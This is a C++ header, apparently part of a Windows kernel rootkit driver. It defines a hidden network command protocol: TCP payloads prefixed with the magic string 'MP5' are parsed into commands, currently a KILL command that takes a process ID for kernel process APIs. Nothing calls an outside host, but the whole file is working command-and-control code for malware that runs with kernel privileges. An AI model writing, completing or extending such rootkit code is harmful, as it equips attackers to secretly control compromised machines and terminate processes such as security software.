#ifndef rootkit_hpp
#define rootkit_hpp

#include <ntddk.h>

static constexpr ULONG MAX_COMMAND_LEN = 128;
static constexpr ULONG MAX_ARGS_LEN = 256;

static constexpr CHAR COMMAND_DELIMETER = '|';
static constexpr UCHAR magic[] = "MP5";
// Wire format is MAGIC|COMMAND|PARAMS, so the on-wire magic excludes the
// C-string null terminator added by the literal.
static const ULONG szMagic = sizeof(magic) - 1;

enum class Command : ULONG {
	UNKNOWN,
	KILL
	// todo
};

struct CommandEntry {
	const char* name;
	Command cmd;
};

static const CommandEntry COMMAND_TABLE[] = {
	{ "KILL", Command::KILL }
};

static constexpr ULONG COMMAND_TABLE_SIZE = sizeof(COMMAND_TABLE) / sizeof(COMMAND_TABLE[0]);

struct ParsedCommand {
	Command command;
	CHAR    args[MAX_ARGS_LEN];
	ULONG   args_len;
};

// Per-command payload structures. Each command parses the raw args buffer in
// ParsedCommand into its own typed shape.
struct KillPacket {
	HANDLE pid;
};

// Length of a null-terminated ASCII string, bounded by cap (no ucrt dep).
inline ULONG cstr_bounded_len(const CHAR* s, ULONG cap) {
	ULONG n = 0;
	while (n < cap && s[n] != '\0')
		++n;
	return n;
}

// Parse up to `len` ASCII decimal digits into *out. Strict: empty input,
// any non-digit, or overflow past MAXULONG returns false. Designed so each
// command handler can extract its own arg shape from ParsedCommand::args
// without the generic parser needing to know about it.
inline bool parse_ulong_ascii(const CHAR* s, ULONG len, ULONG* out) {
	if (!s || !out || len == 0)
		return false;

	ULONG result = 0;
	for (ULONG i = 0; i < len; ++i) {
		const CHAR c = s[i];
		if (c < '0' || c > '9')
			return false;
		const ULONG digit = static_cast<ULONG>(c - '0');
		if (result > (MAXULONG - digit) / 10)
			return false; // would overflow
		result = result * 10 + digit;
	}
	*out = result;
	return true;
}

// Resolve a command name (not null-terminated) against COMMAND_TABLE.
// Returns Command::UNKNOWN if no match.
inline Command lookup_command(const CHAR* name, ULONG name_len) {
	if (!name || name_len == 0 || name_len >= MAX_COMMAND_LEN)
		return Command::UNKNOWN;

	for (ULONG i = 0; i < COMMAND_TABLE_SIZE; ++i) {
		ULONG table_len = cstr_bounded_len(COMMAND_TABLE[i].name, MAX_COMMAND_LEN);
		if (table_len != name_len)
			continue;
		if (RtlCompareMemory(name, COMMAND_TABLE[i].name, name_len) == name_len)
			return COMMAND_TABLE[i].cmd;
	}
	return Command::UNKNOWN;
}

// Parses a TCP payload that begins with `magic` into *out.
// Wire format: MAGIC '|' COMMAND_NAME [ '|' ARGS ]
//   - magic prefix must match exactly and be followed by '|'
//   - COMMAND_NAME is ASCII, up to the next '|' or end of buffer, < MAX_COMMAND_LEN
//   - ARGS (optional) is copied verbatim into out->args and null-terminated;
//     truncated to MAX_ARGS_LEN - 1 bytes if longer.
// Returns false if magic/delimiter are wrong, the name is empty/too long, or
// the name doesn't resolve to a known Command.
inline bool parse_command(const UCHAR* payload, ULONG payload_len, ParsedCommand* out) {
	if (!payload || !out)
		return false;
	RtlZeroMemory(out, sizeof(*out));
	out->command = Command::UNKNOWN;

	// Need magic + delimiter at minimum.
	if (payload_len < szMagic + 1)
		return false;
	if (RtlCompareMemory(payload, magic, szMagic) != szMagic)
		return false;
	if (payload[szMagic] != COMMAND_DELIMETER)
		return false;

	const CHAR* cursor    = reinterpret_cast<const CHAR*>(payload + szMagic + 1);
	ULONG       remaining = payload_len - szMagic - 1;

	// Scan command name up to the delimiter or end-of-buffer.
	ULONG name_len = 0;
	while (name_len < remaining &&
	       name_len < MAX_COMMAND_LEN &&
	       cursor[name_len] != COMMAND_DELIMETER) {
		++name_len;
	}
	if (name_len == 0 || name_len >= MAX_COMMAND_LEN)
		return false;

	Command resolved = lookup_command(cursor, name_len);
	if (resolved == Command::UNKNOWN)
		return false;
	out->command = resolved;

	// Optional args after the delimiter.
	if (name_len < remaining && cursor[name_len] == COMMAND_DELIMETER) {
		ULONG args_off = name_len + 1;
		ULONG args_len = remaining - args_off;
		if (args_len >= MAX_ARGS_LEN)
			args_len = MAX_ARGS_LEN - 1;
		if (args_len > 0)
			RtlCopyMemory(out->args, cursor + args_off, args_len);
		out->args[args_len] = '\0';
		out->args_len = args_len;
	}

	return true;
}

// Decode a KILL args buffer ("<pid>") into a typed KillPacket. The args are
// plain ASCII digits — no sign, no whitespace — matching wire form MP5|KILL|1234.
inline bool parse_kill_packet(const ParsedCommand& cmd, KillPacket* out) {
	if (!out || cmd.command != Command::KILL)
		return false;
	ULONG raw = 0;
	if (!parse_ulong_ascii(cmd.args, cmd.args_len, &raw))
		return false;
	// Kernel APIs (PsLookupProcessByProcessId, ZwOpenProcess, ...) take the
	// PID as HANDLE, which is really a ULONG_PTR-shaped integer. UlongToHandle
	// is the official macro for this conversion (zero-extends on x64).
	out->pid = UlongToHandle(raw);
	return true;
}

#endif //!rootkit_hpp